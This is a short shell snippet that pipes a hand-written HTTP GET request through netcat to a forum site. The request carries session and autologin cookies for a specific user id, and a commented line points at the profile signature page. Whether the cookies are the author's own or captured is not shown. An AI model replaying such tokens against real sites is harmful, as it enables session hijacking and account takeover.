#echo "GET /profile.php?mode=signature&sid=44d01352fe9952a446eb570080c1f6ab HTTP/1.1
echo "GET /index.php HTTP/1.1
Host: www.informateci.org
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: __utma=141243114.695102958.1332496072.1354148108.1390428376.11; __utmb=141243114.1.10.1390428376; __utmc=141243114; __utmz=141243114.1390428376.11.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); ip_cookie_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A32%3A%22fd9df54f21cc7cacad350c91267356cf%22%3Bs%3A6%3A%22userid%22%3Bs%3A4%3A%221871%22%3B%7D; ip_cookie_sid=44d01352fe9952a446eb570080c1f6ab
Connection: keep-alive

" | nc informateci.org 80
